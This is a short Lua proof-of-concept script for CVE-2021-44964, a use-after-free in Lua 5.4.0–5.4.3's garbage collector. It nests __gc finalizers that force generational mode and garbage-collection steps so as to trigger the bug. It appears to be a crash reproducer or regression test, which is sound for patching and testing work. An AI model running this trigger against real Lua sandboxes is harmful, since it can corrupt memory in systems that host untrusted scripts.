--[[
CVE-2021-44964 - https://www.cvedetails.com/cve/CVE-2021-44964/

Use after free in garbage collector and finalizer of lgc.c in Lua interpreter 5.4.0 ~ 5.4.3
allows attackers to perform Sandbox Escape via a crafted script file.
]]

setmetatable({}, {
    __gc = function()
        setmetatable({}, {
            __gc = function()
                collectgarbage("generational") -- Explicitly change mode
                setmetatable({}, {
                    __gc = function()
                        collectgarbage("step")
                        collectgarbage("step")()
                    end
                })
            end
        })
        collectgarbage("step")
    end
})
